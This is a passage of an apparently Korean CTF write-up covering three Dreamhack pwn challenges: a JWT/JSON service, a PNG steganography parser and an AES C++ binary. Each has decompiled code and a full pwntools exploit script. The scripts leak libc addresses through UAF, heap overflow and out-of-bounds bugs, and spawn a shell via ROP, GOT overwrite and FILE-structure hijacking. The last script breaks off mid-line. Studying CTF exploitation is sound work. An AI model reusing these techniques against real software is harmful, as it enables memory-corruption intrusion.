b\u0026#39;}\u0026#39; return ret def register(username, email, car, vin, company): a = { \u0026#39;header\u0026#39;:{ \u0026#39;method\u0026#39;:\u0026#39;register\u0026#39; }, \u0026#39;args\u0026#39;:{ \u0026#39;username\u0026#39;:username, \u0026#39;email\u0026#39;:email, \u0026#39;Car\u0026#39;:car, \u0026#39;VIN\u0026#39;:vin, \u0026#39;Company\u0026#39;:company, }, } # max vin 0x11,username 0x10 payload = dump(a) return payload def login(token): a = { \u0026#39;header\u0026#39;:{ \u0026#39;method\u0026#39;:\u0026#39;login\u0026#39; }, \u0026#39;args\u0026#39; : { \u0026#39;token\u0026#39; : token } } payload = dump(a) return payload def token_status(): a = { \u0026#39;header\u0026#39;:{ \u0026#39;method\u0026#39;:\u0026#39;token_status\u0026#39; }, } payload = dump(a) return payload def play(): a = { \u0026#39;header\u0026#39;:{ \u0026#39;method\u0026#39;:\u0026#39;play\u0026#39; }, } payload = dump(a) return payload def logout(token): a = { \u0026#39;header\u0026#39;:{ \u0026#39;method\u0026#39;:\u0026#39;logout\u0026#39; }, \u0026#39;args\u0026#39;:{ \u0026#39;token\u0026#39; : token } } payload = dump(a) return payload def update(): a = { \u0026#39;header\u0026#39;:{ \u0026#39;method\u0026#39;:\u0026#39;logout\u0026#39; }, \u0026#39;args\u0026#39;:{ \u0026#39;token\u0026#39; : token } } payload = dump(a) return payload def upload(data : list): a = { \u0026#39;header\u0026#39;:{ \u0026#39;method\u0026#39;:\u0026#39;upload\u0026#39; }, \u0026#39;args\u0026#39;:{ \u0026#39;idx\u0026#39;:[1,2,3], \u0026#39;data\u0026#39;: data } } payload = dump(a) return payload if __name__ == \u0026#39;__main__\u0026#39;: # p = process(\u0026#39;./sonofthec\u0026#39;,env={\u0026#39;LD_PRELOAD\u0026#39;:\u0026#39;./libc.so.6\u0026#39;}) p = remote(\u0026#39;host3.dreamhack.games\u0026#39;,8303) payload = register(b\u0026#39;A\u0026#39;*0x10,b\u0026#39;asdf\u0026#39;,b\u0026#39;morning\u0026#39;,b\u0026#39;A\u0026#39;*0x11,b\u0026#39;Dreamhack\u0026#39;) # if company is not Dreamhack exception raised. print(payload) # pause() sl(payload) rv = json.loads(rvl()[:-1]) tok = rv[\u0026#39;token\u0026#39;] payload = register(b\u0026#39;A\u0026#39;*0x10,b\u0026#39;asdf\u0026#39;,b\u0026#39;morning\u0026#39;,b\u0026#39;A\u0026#39;*0x11,b\u0026#39;Dreamhack\u0026#39;) sl(payload) rv = json.loads(rvl()[:-1]) tok = rv[\u0026#39;token\u0026#39;] payload = register(b\u0026#39;A\u0026#39;*0x8,b\u0026#39;asdf\u0026#39;,b\u0026#39;morning\u0026#39;,b\u0026#39;A\u0026#39;*0x11,b\u0026#39;Dreamhack\u0026#39;) sl(payload) rv = json.loads(rvl()[:-1]) tok = rv[\u0026#39;token\u0026#39;] payload = login(tok) print(payload) sl(payload) \\#leak success(\u0026#34;sleeping 30s\u0026#34;) sleep(30) success(\u0026#39;now token is expired memleak.\u0026#39;) payload = token_status() context.log_level=\u0026#39;debug\u0026#39; sl(payload) rvu(b\u0026#39;A\u0026#39;*8) libc_base = u64(rvl()[:-1].ljust(8,b\u0026#39;\\x00\u0026#39;)) - 0x219df0 success(hex(libc_base)) # exp time = 30sec, so exception will be raised after 30s # if exception is thrown while proccessing JWT token validation, it traps and use ptr, a global variable to print things out so that they can print out some memory. # because this program frequently allocates mem and free, there\u0026#39;s freed chunk in unsorted bin, once i reclaim it, i can get libc_base. payload = [1]*0x11 + [\u0026#34;1\u0026#34;] + [1]+ [libc_base + 0x000000000002a3e5, libc_base + 0x1d8698, libc_base + 0x0000000000029cd6,libc_base + 0x000000000050d60] payload = upload(payload) print(payload) pause() sl(payload) p.interactive() # 0000C139\t.plt.sec:___cxa_throw+4\tbnd jmp cs:__cxa_throw_ptr\tRAX=000055EBCC696A48 RDX=000055EBCC683FB8 RSI=000055EBCC696A48 RDI=000055EBCDE23EE0 # KAPO{js0n_C_w1th_jwt_t0ken_hs_256} online stego @app.route(\u0026#39;/encode\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def post_encode(): if \u0026#39;png\u0026#39; not in request.files: abort(400) if \u0026#39;msg\u0026#39; not in request.form: abort(400) png = request.files[\u0026#39;png\u0026#39;] msg = request.form[\u0026#39;msg\u0026#39;] if not validate_extension(png.filename): abort(400) filename = os.urandom(32).hex() + \u0026#39;.png\u0026#39; png.save(os.path.join(app.config[\u0026#39;UPLOAD_DIR\u0026#39;], filename)) result = subprocess.check_output([STEGO_PATH, \u0026#39;-e\u0026#39;, \u0026#39;-f\u0026#39;, app.config[\u0026#39;UPLOAD_DIR\u0026#39;] + \u0026#39;/\u0026#39; + filename, \u0026#39;-m\u0026#39;, msg]) return render_template(\u0026#39;encode_result.html\u0026#39;, href=f\u0026#39;{result.decode()}\u0026#39;) @app.route(\u0026#39;/uploads/\u0026lt;path:filename\u0026gt;\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def get_uploads(filename): return send_from_directory(UPLOAD_DIR, filename) @app.route(\u0026#39;/decode\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def get_decode(): return render_template(\u0026#39;decode.html\u0026#39;) @app.route(\u0026#39;/decode\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def post_decode(): if \u0026#39;png\u0026#39; not in request.files: abort(400) png = request.files[\u0026#39;png\u0026#39;] if not validate_extension(png.filename): abort(400) filename = os.urandom(32).hex() + \u0026#39;.png\u0026#39; png.save(os.path.join(app.config[\u0026#39;UPLOAD_DIR\u0026#39;], filename)) result = subprocess.check_output([STEGO_PATH, \u0026#39;-d\u0026#39;, \u0026#39;-f\u0026#39;, app.config[\u0026#39;UPLOAD_DIR\u0026#39;] + \u0026#39;/\u0026#39; + filename]) return render_template(\u0026#39;decode_result.html\u0026#39;, msg=f\u0026#39;{result.decode()}\u0026#39;) 그냥 바이너리를 실행해서 출력한다.\n#!/bin/bash sysctl kernel.randomize_va_space=0 su chall -c \u0026#34;export LC_ALL=C.UTF-8; export LANG=C.UTF-8; /bin/sh -c \u0026#39;while true; do flask run -h 0.0.0.0 ; done\u0026#39;\u0026#34; aslr이 꺼져있다.\nif ( de_flag != 2 ) { if ( de_flag == 1 ) decode(filename); fwrite(\u0026#34;Error: Please specify either -d(decoding mode) or -e(encoding mode) option.\\n\u0026#34;, 1uLL, 0x4CuLL, stderr); exit(1); } encode(filename, message_content); return 0LL; png의 청크를 파싱하고, 메세지를 숨기거나 해독할 수 있다.\nstream = fopen(filename, \u0026#34;r\u0026#34;); ... v8 = fread(sig, 1uLL, 8uLL, stream); ... ihdr = parse_chunk(stream); if ( memcmp(\u0026amp;ihdr-\u0026gt;type, \u0026#34;IHDR\u0026#34;, 4uLL) ) { fwrite(\u0026#34;Error: chunk type mismatched\\n\u0026#34;, 1uLL, 0x1DuLL, stderr); exit(1); } master_node = set_node((__int64)ihdr); do { ihdr = parse_chunk(stream); v5 = set_node((__int64)ihdr); set_link(master_node, v5); // circular doubly linked } while ( memcmp(\u0026amp;ihdr-\u0026gt;type, \u0026#34;IEND\u0026#34;, 4uLL) ); // scan while IEND v4 = ftell(stream); fseek(stream, 0LL, 2); v1 = ftell(stream); if ( v4 != v1 ) { fwrite(\u0026#34;Error: wrong footer\\n\u0026#34;, 1uLL, 0x14uLL, stderr); exit(1); 다음과 같이 청크를 파싱한다. parsechunk 함수는 다음과 같다.\nv8 = (chunk *)malloc(0x20uLL); read = fread(\u0026amp;sz, 1uLL, 4uLL, a1); ... sz = conv_big2little(sz); read = fread(\u0026amp;tpye, 1uLL, 4uLL, a1); ... mem = malloc((unsigned __int16)sz); if ( !mem ) { fwrite(\u0026#34;Error: malloc()\\n\u0026#34;, 1uLL, 0x10uLL, stderr); exit(1); } read = fread(mem, 1uLL, sz, a1); ... read = fread(\u0026amp;crc, 1uLL, 4uLL, a1); if ( read \u0026lt;= 3 ) { fwrite(\u0026#34;Error: fread()\\n\u0026#34;, 1uLL, 0xFuLL, stderr); exit(1); } crc = conv_big2little(crc); v5 = crc32(0xFFFFFFFF, (__int64)\u0026amp;tpye, 4u); v5 = ~(unsigned int)crc32(v5, (__int64)mem, sz); if ( v5 != crc ) { fwrite(\u0026#34;Error: crc mismatched\\n\u0026#34;, 1uLL, 0x16uLL, stderr); exit(1); } v8-\u0026gt;length = sz; v8-\u0026gt;type = tpye; v8-\u0026gt;payload = (__int64)mem; v8-\u0026gt;crc = crc; return v8; heap overflow가 발생한다.\nnode *__fastcall set_link(node *master_node, node *new_node) { node *result; // rax node *fd; // [rsp+18h] [rbp-8h] fd = master_node-\u0026gt;fd; fd-\u0026gt;bk = new_node; master_node-\u0026gt;fd = new_node; new_node-\u0026gt;bk = master_node; result = new_node; new_node-\u0026gt;fd = fd; return result; } 이런식으로 circular doubly linked list로 연결되어있다.\nfor ( master_node = (node *)parse(a1); ; pop(master_node) ) { node = get_current_node(master_node); l_ptr = (uint *)\u0026amp;node-\u0026gt;length; if ( !memcmp(\u0026amp;node-\u0026gt;type, \u0026#34;iTXt\u0026#34;, 4uLL) \u0026amp;\u0026amp; !memcmp(\u0026amp;node-\u0026gt;payload-\u0026gt;hdr, secret_hdr, 4uLL) ) break; } if ( *l_ptr \u0026lt;= 8 ) { fwrite(\u0026#34;Error: unable to decode\\n\u0026#34;, 1uLL, 0x18uLL, stderr); exit(1); } secret_msg_length = *l_ptr - 8; p_secret_msg = \u0026amp;node-\u0026gt;payload-\u0026gt;secret_msg; malloc(2 * (__int16)*l_ptr); // sign extension if ( v2 ) // uninitiaized stack var iTXt에 메세지를 암호화하고, decode는 iTXt에서 메세지를 해독한다.\nprev = master_node-\u0026gt;fd; cur = master_node-\u0026gt;fd-\u0026gt;fd; // real current node next = cur-\u0026gt;fd; next-\u0026gt;bk = master_node-\u0026gt;fd; prev-\u0026gt;fd = next; free(cur-\u0026gt;payload); free(cur); 노드를 unlink하는데, 약간 이상하다. masternode→fd→fd로 돌게된다.\nfor ( master_node = (node *)parse(a1); ; pop(master_node) ) { node = get_current_node(master_node); l_ptr = (uint *)\u0026amp;node-\u0026gt;length; if ( !memcmp(\u0026amp;node-\u0026gt;type, \u0026#34;iTXt\u0026#34;, 4uLL) \u0026amp;\u0026amp; !memcmp(\u0026amp;node-\u0026gt;payload-\u0026gt;hdr, secret_hdr, 4uLL) ) break; } 루프를 돌면서 로직 버그가 발생하며, free되면서 chunk_payload + 0x0에는 next freed 청크가 들어가기 때문에, 유저가 다음 노드를 조작할 수 있게 된다. 노드가 적다면, DFB를 트리거할 수 있지만, glibc 2.27의 검증 때문에 불가하다. 노드를 너무 늘리면 결국 singly linked list 형태로 bin에 쌓여서 NULL로 끝나게 되고, 순회하기 충분치 않아 null pointer dereference가 발생하여 DOS로 끝난다.\nmalloc(2 * (__int16)*l_ptr); // sign extension if ( v2 ) // uninitiaized stack var s = (sec_msg_hdr *)v2; else s = node-\u0026gt;payload; r = (char *)malloc(4uLL); if ( !r ) { fwrite(\u0026#34;Error: malloc()\\n\u0026#34;, 1uLL, 0x10uLL, stderr); exit(1); } *(_DWORD *)r = *(_DWORD *)node-\u0026gt;payload; recover(s-\u0026gt;msg, r, (char *)p_secret_msg, secret_msg_length); 이후 해독을 진행한다.\nExploit from pwn import * def calc_crc(chunk:bytes) -\u0026gt; int: sz = u32(chunk[:4],endian=\u0026#39;big\u0026#39;) def crc(init : int , asdf : bytes, l : int): v3 = 0 for i in range(l): init ^= asdf[i] for j in range(8): if (init \u0026amp; 1): v3 = 0xEDB88320 else: v3 = 0 init = (init\u0026gt;\u0026gt;1) ^ v3 return init v5 = crc(0xffffffff, chunk[4:8], 4) v5 = ~(crc(v5, chunk[8:],sz)) return v5 def gen_chunk(data_length, type : bytes, data : bytes): payload = b\u0026#39;\u0026#39; payload += p32(data_length,endian=\u0026#39;big\u0026#39;) payload += type payload += data crc = calc_crc(payload) \u0026amp; 0xffffffff payload += p32(crc,endian=\u0026#39;big\u0026#39;) return payload # (a1 \u0026gt;\u0026gt; 8) \u0026amp; 0xFF00 | (a1 \u0026lt;\u0026lt; 8) \u0026amp; 0xFF0000 | (a1 \u0026lt;\u0026lt; 24) | HIBYTE(a1); # a1[2]\u0026gt;\u0026gt;8 | a[1]\u0026lt;\u0026lt;8 | a1[0] \u0026lt;\u0026lt; 24 | a[3] \u0026gt;\u0026gt; 24 # because chunks are linked as a circular doubly linked list, with enough freed chunks u can trigger DFB # glibc 2.27 has tcache-\u0026gt;key validation. no dfb # masternode -\u0026gt; node3 -\u0026gt; node2 -\u0026gt; node1 # masternode -\u0026gt; fd -\u0026gt; fd == current node # masternode -\u0026gt; fd == prev node # masternode -\u0026gt; fd -\u0026gt; fd -\u0026gt; fd == next node # unlink , pop # matsernode -\u0026gt; fd -\u0026gt; fd -\u0026gt; fd -\u0026gt; bk = masternode -\u0026gt; fd # masternode -\u0026gt; fd -\u0026gt; fd = masternode -\u0026gt; fd -\u0026gt; fd -\u0026gt; fd # free payload # free node # trigger1 # payload = bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]) # payload += gen_chunk(0x20, b\u0026#39;IHDR\u0026#39;, b\u0026#39;A\u0026#39;*0x20) # chunk = b\u0026#39;\u0026#39; # chunk += bytes([0xCA, 0xFE, 0xCA, 0xFE])*3 # chunk += p32(0) # chunk += p32(0x378) # chunk += b\u0026#39;iTXt\u0026#39; # chunk += b\u0026#39;A\u0026#39;*(0x28 - len(chunk)) # chunk += p64(0x7fffffffd7fc-4) # payload += gen_chunk(0x30, b\u0026#39;NOD2\u0026#39;, chunk) # payload += gen_chunk(0x30, b\u0026#39;NOD1\u0026#39;, bytes([0xCA, 0xFE, 0xCA, 0xFE])*2*2*3) # payload += gen_chunk(0x30, b\u0026#39;IEND\u0026#39;, p32(0)*7+bytes([0xca, 0xfe, 0xca, 0xfe])+b\u0026#39;B\u0026#39;*0x10) # trigger2 heapoverflow payload = bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]) pay = b\u0026#39;\u0026#39; pay += b\u0026#39;A\u0026#39;*(0xf8-len(pay)) pay += p64(0xffffffffffffffff) pay += b\u0026#39;B\u0026#39;*(0x100f8-len(pay)) payload += gen_chunk(0x100f8,b\u0026#39;IHDR\u0026#39;,pay) chunk = b\u0026#39;\u0026#39; chunk += bytes([0xCA, 0xFE, 0xCA, 0xFE])*3 chunk += p32(0) chunk += p32(0xffffec58+0x10-0x20) # size chunk += b\u0026#39;iTXt\u0026#39; chunk += p32(0x400CC7) chunk += bytes([0xCA, 0xFE, 0xCA, 0xFE]) # hdr for payload ptr chunk += b\u0026#39;C\u0026#39;*(0x28 - len(chunk)) chunk += p64(0x6045bc) # payload ptr payload += gen_chunk(0x30, b\u0026#39;NOD2\u0026#39;, chunk) payload += gen_chunk(0x30, b\u0026#39;NOD1\u0026#39;, b\u0026#39;A\u0026#39;*0x30) payload += gen_chunk(0x30, b\u0026#39;IEND\u0026#39;, p32(0)*7+bytes([0xca, 0xfe, 0xca, 0xfe])+b\u0026#39;B\u0026#39;*0x10) # payload -\u0026gt; asdf ptr with open(\u0026#39;./exploit.png\u0026#39;,\u0026#39;wb\u0026#39;) as f: f.write(payload) # 0x400CC7 -\u0026gt; read flag # 0x13e4 victim = av-\u0026gt;top; size = chunksize (victim); if ((unsigned long) (size) \u0026gt;= (unsigned long) (nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); av-\u0026gt;top = remainder; set_head (victim, nb | PREV_INUSE | (av != \u0026amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } /* When we are using atomic ops to free fast chunks we can get here for all block sizes. */ else if (atomic_load_relaxed (\u0026amp;av-\u0026gt;have_fastchunks)) { malloc_consolidate (av); /* restore original bin index */ if (in_smallbin_range (nb)) idx = smallbin_index (nb); else idx = largebin_index (nb); } glibc 2.27 소스를 확인해보면 chunk_at_offset에서 victim + nb를 하게 된다. heap overflow로 size를 덮어서 검증을 우회하고, 0xffff까지의 입력을 넣을 수 있으니 sign extension이 발생하며 이를 이용해서 top chunk로 부터의 상대 주소로 접근할 수 있게된다. 0xffff의 입력은 page 단위로 올라가기 충분하며, got에 접근할 수 있다. 그걸 이용해 exit got를 덮는다.\nAespropective print_menu(); std::istream::operator\u0026gt;\u0026gt;((int64_t)\u0026amp;std::cin, (int64_t)sel); switch ( sel[0] ) { case 1: create_AES_obj(); break; case 2: remove_AES_obj(); break; case 3: set_plain_cipher_txt(); break; case 4: enc(); break; case 5: dec(\u0026amp;std::cin, sel); // useless, not implemented yet break; default: continue; } } } // UAF leads to memory leak std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;((int64_t)\u0026amp;std::cout, (int64_t)\u0026#34;Enter key size: \u0026#34;); std::istream::operator\u0026gt;\u0026gt;((int64_t)\u0026amp;std::cin, (int64_t)\u0026amp;keysz); switch ( keysz ) { case 128u: v1 = (AES_obj *)operator new(0x28uLL); init_AES_128(v1); aes_obj_ptr = v1; break; case 192u: v2 = (__int64 *)operator new(0x28uLL); init_AES_192(v2); aes_obj_ptr = (AES_obj *)v2; break; case 256u: v3 = (__int64 *)operator new(0x28uLL); init_AES_256(v3); aes_obj_ptr = (AES_obj *)v3; break; default: v4 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;((int64_t)\u0026amp;std::cout, (int64_t)\u0026#34;No way\u0026#34;); ((void (__fastcall *)(__int64, void *))std::ostream::operator\u0026lt;\u0026lt;)(v4, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); exit(0); } keysz \u0026gt;\u0026gt;= 3; key_content = (void *)operator new[](keysz); set_cipher_key(key_content, keysz); key_schedule(aes_obj_ptr, (char *)key_content);// AES256 OoB. Key corrupted. v5 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;( (int64_t)\u0026amp;std::cout, (int64_t)\u0026#34;This is sha256 for the encryption key: \u0026#34;); ((void (__fastcall *)(__int64, void *))std::ostream::operator\u0026lt;\u0026lt;)(v5, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); sha256((__int64)hashed_output, aes_obj_ptr); v6 = std::operator\u0026lt;\u0026lt;\u0026lt;char\u0026gt;(\u0026amp;std::cout, hashed_output); 키 사이즈에 따른 aes 객체들이 구현되어있다. 리버싱한 결과, AES ECB임이 확인되었다. 그리고 따로 처음에 키 스케쥴링 로직도 확인되었다.\nv6 = __readfsqword(0x28u); obj-\u0026gt;cipher_and_round_keys = (char *)operator new[](0xB0uLL); *(_DWORD *)key_back = 0; *(_DWORD *)rcon = 0; for ( i = 0; i \u0026lt;= 15; ++i ) obj-\u0026gt;cipher_and_round_keys[i] = obj-\u0026gt;key_content[i]; for ( j = 16; j \u0026lt;= 0xAF; j += 4 ) { key_back[0] = obj-\u0026gt;cipher_and_round_keys[j - 4]; key_back[1] = obj-\u0026gt;cipher_and_round_keys[j - 3]; key_back[2] = obj-\u0026gt;cipher_and_round_keys[j - 2]; key_back[3] = obj-\u0026gt;cipher_and_round_keys[j - 1]; if ( ((j / 4) \u0026amp; 3) == 0 ) // multiples of 4, means following logics applied at roundkey\u0026#39;s first col { Rot_word(obj, key_back); // shift upwards Sub_bytes(obj, (int8_t *)key_back); set_rcon(obj, rcon, j / 16); add_rcon(obj, (char *)key_back, rcon, (char *)key_back); } obj-\u0026gt;cipher_and_round_keys[j] = key_back[0] ^ obj-\u0026gt;cipher_and_round_keys[j - 16]; obj-\u0026gt;cipher_and_round_keys[j + 1] = key_back[1] ^ obj-\u0026gt;cipher_and_round_keys[j - 15]; obj-\u0026gt;cipher_and_round_keys[j + 2] = key_back[2] ^ obj-\u0026gt;cipher_and_round_keys[j - 14]; obj-\u0026gt;cipher_and_round_keys[j + 3] = key_back[3] ^ obj-\u0026gt;cipher_and_round_keys[j - 13]; } return __readfsqword(0x28u) ^ v6; } // do keyscheduling 이런식으로 처음에 round key들을 미리 계산한다.\nunsigned __int64 v6; // [rsp+28h] [rbp-8h] v6 = __readfsqword(0x28u); a1-\u0026gt;cipher_and_round_keys = (char *)operator new[](0xD0uLL); v4 = 0; v5 = 0; for ( i = 0; i \u0026lt;= 23; ++i ) a1-\u0026gt;cipher_and_round_keys[i] = a1-\u0026gt;key_content[i]; for ( j = 24; j \u0026lt;= 0xCF; j += 4 ) { LOWORD(v4) = *(_WORD *)\u0026amp;a1-\u0026gt;cipher_and_round_keys[j - 4]; BYTE2(v4) = a1-\u0026gt;cipher_and_round_keys[j - 2]; HIBYTE(v4) = a1-\u0026gt;cipher_and_round_keys[j - 1]; if ( !(j / 4 % 6) ) { Rot_word(a1, (unsigned __int8 *)\u0026amp;v4); Sub_bytes(a1, (int8_t *)\u0026amp;v4); set_rcon(a1, (char *)\u0026amp;v5, j / 24); add_rcon(a1, (char *)\u0026amp;v4, (char *)\u0026amp;v5, (char *)\u0026amp;v4); } a1-\u0026gt;cipher_and_round_keys[j] = v4 ^ a1-\u0026gt;cipher_and_round_keys[j - 24]; a1-\u0026gt;cipher_and_round_keys[j + 1] = BYTE1(v4) ^ a1-\u0026gt;cipher_and_round_keys[j - 23]; a1-\u0026gt;cipher_and_round_keys[j + 2] = BYTE2(v4) ^ a1-\u0026gt;cipher_and_round_keys[j - 22]; a1-\u0026gt;cipher_and_round_keys[j + 3] = HIBYTE(v4) ^ a1-\u0026gt;cipher_and_round_keys[j - 21]; } return __readfsqword(0x28u) ^ v6; } AES192의 키 스케쥴링 로직에서 OoB Read가 발생하며, secret키의 일부에 반영된다. 또한 remove 과정에 있어서 로직 버그가 발생하여 정상적이지 않은 노드가 free될 수 있었다.\nv9 = __readfsqword(0x28u); std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;((int64_t)\u0026amp;std::cout, (int64_t)\u0026#34;Which index do you want to delete ?\u0026#34;); std::istream::operator\u0026gt;\u0026gt;((int64_t)\u0026amp;std::cin, (int64_t)\u0026amp;idx); v0 = idx; if ( v0 \u0026gt;= get_length(vector_AES_obj) ) { v1 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;((int64_t)\u0026amp;std::cout, (int64_t)\u0026#34;No way\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v1, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); exit(0); } idx_1 = idx; iterator = get_vector_iterator(vector_AES_obj); v7 = get_ele_by_idx(\u0026amp;iterator, idx_1); copy_element_ptr(\u0026amp;element_ptr, (__int64)\u0026amp;v7); remove_element((__int64)vector_AES_obj, element_ptr); v3 = *(void **)get_vect_at_idx(vector_AES_obj, idx);// OoB delete if ( v3 ) operator delete(v3, 0x28uLL); return __readfsqword(0x28u) ^ v9; } __int64 __fastcall sub_3524(__int64 vecotr, __int64 ele_vect_ptr) { __int64 ned; // rbx __int64 ele_by_idx; // rax __int64 ele_vec; // [rsp+0h] [rbp-40h] BYREF __int64 v6; // [rsp+8h] [rbp-38h] __int64 next_one; // [rsp+18h] [rbp-28h] BYREF __int64 end[4]; // [rsp+20h] [rbp-20h] BYREF v6 = vecotr; ele_vec = ele_vect_ptr; end[1] = __readfsqword(0x28u); end[0] = get_end(vecotr); // vector end next_one = get_ele_by_idx(\u0026amp;ele_vec, 1LL); if ( is_not_end((__int64)\u0026amp;next_one, (__int64)end) ) { ned = get_end(v6); ele_by_idx = get_ele_by_idx(\u0026amp;ele_vec, 1LL); delete_element(ele_by_idx, ned, ele_vec); } *(_QWORD *)(v6 + 8) -= 8LL; // decrement sub_3872(v6, *(_QWORD *)(v6 + 8)); return ele_vec; } 마지막 노드를 삭제시 정상적으로 free가 된다. 하지만 중간 노드에 대해 삭제를 진행하면, dangling pointer가 남게 되고, double free가 발생할 수 있다. fastbin에서 free 검증이 널널하다는 것을 생각하면, dfb도 트리거가 가능해진다.\nstd::istream::operator\u0026gt;\u0026gt;((int64_t)\u0026amp;std::cin, (int64_t)\u0026amp;len); if ( len \u0026gt; 0x400 || (len \u0026amp; 0xF) != 0 ) { v0 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;((int64_t)\u0026amp;std::cout, (int64_t)\u0026#34;Invalid {plain,cipher}text length\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v0, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); exit(0); } if ( nbytes != len ) buf = (void *)operator new[](len); nbytes = len; std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;((int64_t)\u0026amp;std::cout, (int64_t)\u0026#34;Enter {plain,cipher}text: \u0026#34;); read(0, buf, nbytes); return __readfsqword(0x28u) ^ v3; 여기서 freed chunk 대해서 reclaim이 가능하다. 또한 잠재적인 UAF가 발생할 수 있다.\nExploit \u0026#39;\u0026#39;\u0026#39; 1) AES256 Vulnerable OoB READ while initializing Key. 2) deleting aes object triggers UAF. 3) buf reclaim leads to memleak. \u0026#39;\u0026#39;\u0026#39; from pwn import * \\#p = process(\u0026#39;./out.bin\u0026#39;) p = remote(\u0026#39;host3.dreamhack.games\u0026#39;, 18810) context.binary = e = ELF(\u0026#39;./out.bin\u0026#39;) libc = ELF(\u0026#39;./bc.so.6\u0026#39;) sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) rvu = lambda x : p.recvuntil(x) def create_AES_object(keysz): sla(b\u0026#39;\u0026gt;\u0026gt;\u0026#39;,str(1)) sla(b\u0026#39;size: \u0026#39;,str(keysz)) def remove_AES_object(idx): sla(b\u0026#39;\u0026gt;\u0026gt;\u0026#39;,str(2)) sla(b\u0026#39;delete\u0026#39;,str(idx)) def set_plain_cipher_txt(sz, payload): assert sz\u0026amp;0xf==0 sla(b\u0026#39;\u0026gt;\u0026gt;\u0026#39;,str(3)) sla(b\u0026#39;length:\u0026#39;,str(sz)) sa(b\u0026#39;text: \u0026#39;,payload) def encrypt(idx): sla(b\u0026#39;\u0026gt;\u0026gt; \u0026#39;,str(4)) sla(b\u0026#39;?\u0026#39;,str(idx)) for i in range(20): # 11 create_AES_object(128) for i in range(19,12,-1): # 10 remove_AES_object(i) remove_AES_object(6) # free # vect[3] = vect[4], vect[5] remove_AES_object(4) # vect[1] = vect[2], vect[4] remove_AES_object(4) # for i in range(6): # set_plain_cipher_txt(0x20,b\u0026#39;\\xa0\u0026#39;) # set_plain_cipher_txt(0x10,b\u0026#39;\\xa0\u0026#39;) for i in range(3): create_AES_object(128) set_plain_cipher_txt(0x20,b\u0026#39;\\xa0\u0026#39;) create_AES_object(128) set_plain_cipher_txt(0x10,b\u0026#39;\\xa0\u0026#39;) set_plain_cipher_txt(0x20,b\u0026#39;\\xe8\u0026#39;) encrypt(4) rv = (p.recv(0x20)) bin_base = u64(rv[:8]) - 0x00DBE8 heap = u64(rv[16:16+8]) success(hex(heap)) success(hex(bin_base)) remove_AES_object(3) set_plain_cipher_txt(0x20,p64(bin_base+0x0E030)+p64(0)) set_plain_cipher_txt(0x10,b\u0026#39;\\xa0\u0026#39;) set_plain_cipher_txt(0x20,p64(bin_base + 0x00DBE8)) set_plain_cipher_txt(0x10,b\u0026#39;\\xa0\u0026#39;) set_plain_cipher_txt(0x20,p64(0)) encrypt(3) rv = (p.recv(0x20)) libc_base = u64(rv[16:24]) - libc.sym._IO_2_1_stdout_ success(hex(libc_base)) vtable = 0x1e9260 + libc_base payload_start = heap -0x29b0 payload = b\u0026#39;\u0026#39; payload += p64(0x00000000fbad2084) payload += p64(0) * 12 payload += p64(libc_base + libc.sym._IO_2_1_stdin_) payload += p64(1) payload += p64(0xffffffffffffffff) payload += p64(0) payload += p64(heap) # lock payload += p64(0xffffffffffffffff) payload += p64(0) payload += p64(heap+0x20) payload += p64(0)*6 payload += p64(vtable) payload += p64(payload_start + len(payload)+8) payload += p64(0) * 7 payload += p64(libc_base + libc.sym[\u0026#34;system\u0026#34;]) payload += p64(0) payload += p64(libc_base+ next(libc.search(b\u0026#39;/bin/sh\u0026#39;))) payload += p64(1) assert len(payload) \u0026lt; 0x200 remove_AES_object(2) stdcpp_target= libc_base + 0x1ded60 + 0x20d000 + 0x40 set_plain_cipher_txt(0x200,payload) set_plain_cipher_txt(0x20,p64(stdcpp_target)+p64(0)) remove_AES_object(1) set_plain_cipher_txt(0x20,p64(stdcpp_target)+p64(0)) remove_AES_object(0) set_plain_cipher_txt(0x20,p64(stdcpp_target)+p64(0)) # set target set_plain_cipher_txt(0x10,p64(bin_base+0x0E030)+p64(0)) set_plain_cipher_txt(0x20,p64(0xdeadbeef)) set_plain_cipher_txt(0x10,p64(bin_base+0x0E030)+p64(0)) pause() set_plain_cipher_txt(0x20,p64(payload_start)) success(payload_start) # remove_AES_object(1) # set_plain_cipher_txt(0x20,p64(bin_base+0x0E030)+p64(0)) # pause() # set_plain_cipher_txt(0x20,p64(0)*3+p64(payload_start)) # remove_AES_object(3) # set_plain_cipher_txt(0x20,p64(bin_base+0x0E030)+p64(0)) # for i in range(2): # set_plain_cipher_txt(0x20,b\u0026#39;\\x30\u0026#39;) # set_plain_cipher_txt(0x10,b\u0026#39;A\u0026#39;) # set_plain_cipher_txt(0x20,b\u0026#39;\\x30\u0026#39;) # create_AES_object(128) # 